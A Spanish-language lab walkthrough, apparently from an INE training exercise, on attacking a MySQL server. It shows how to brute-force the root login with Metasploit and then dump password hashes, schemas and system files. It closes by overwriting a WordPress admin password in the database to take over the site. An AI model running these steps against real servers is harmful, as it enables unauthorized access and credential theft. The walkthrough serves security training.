# 🗄️ Enumeración MySQL

## 📡 Verificación y escaneo inicial

```bash
ping -c 4 demo.ine.local
```

El objetivo es alcanzable. Se continúa con un escaneo Nmap para identificar el puerto del servicio:

```bash
nmap demo.ine.local
```

El servicio MySQL se ejecuta en el puerto **3306**.

## 🔍 Detección de la versión

### Módulo `mysql_version`

```bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
```

Si se desea buscar exploits públicos para una versión concreta, por ejemplo MySQL 5.5:

```bash
searchsploit MySQL 5.5
```

## 🔐 Fuerza bruta de inicio de sesión

```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

Si el usuario `root` tiene una contraseña en blanco o vacía, el módulo lo indicará.

## 💻 Enumeración avanzada con Metasploit

Una vez obtenidas credenciales válidas (ejemplo: `root:twinkle`), se ejecutan los siguientes módulos:

### 1. Enumeración general del servidor

```bash
use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

### 2. Ejecución de consultas SQL arbitrarias

```bash
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

### 3. Enumeración de archivos del sistema

```bash
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
```

### 4. Volcado de hashes de contraseñas

```bash
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

### 5. Volcado del esquema de bases de datos

```bash
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

### 6. Directorios con permisos de escritura

```bash
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

## 🖥️ Conexión manual con mysql

También es posible autenticarse directamente desde la terminal:

```bash
mysql -u root -p -h demo.ine.local
```

Si la contraseña está en blanco, simplemente se pulsa Enter. Una vez dentro, se pueden ejecutar comandos SQL.

### 📂 Exploración de bases de datos y tablas

```sql
show databases;
use wordpress;
show tables;
select * from wp_users;
```

En el laboratorio se identificó una tabla `secret_info` dentro de una base de datos accesible sin autenticación, que contenía banderas.

## 🔄 Modificación de credenciales de WordPress

Si el servidor MySQL aloja la base de datos de WordPress, se puede cambiar la contraseña del administrador:

```sql
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
```

Luego, se accede al panel de administración en la URL:

```
http://demo.ine.local:8585/wordpress/wp-admin
```

utilizando `admin` / `password123`.

## 📋 Resumen de módulos utilizados

| Módulo Metasploit | Propósito |
|-------------------|-----------|
| `auxiliary/scanner/mysql/mysql_version` | Obtener versión exacta de MySQL |
| `auxiliary/scanner/mysql/mysql_login` | Ataque de fuerza bruta al login |
| `auxiliary/admin/mysql/mysql_enum` | Información general del servidor |
| `auxiliary/admin/mysql/mysql_sql` | Ejecutar sentencias SQL |
| `auxiliary/scanner/mysql/mysql_file_enum` | Leer archivos del sistema si hay privilegios |
| `auxiliary/scanner/mysql/mysql_hashdump` | Volcar hashes de contraseñas de MySQL |
| `auxiliary/scanner/mysql/mysql_schemadump` | Extraer estructura de bases de datos |
| `auxiliary/scanner/mysql/mysql_writable_dirs` | Identificar directorios escribibles |

La combinación de estos módulos proporciona un conocimiento profundo de la configuración del servidor MySQL y sus bases de datos.
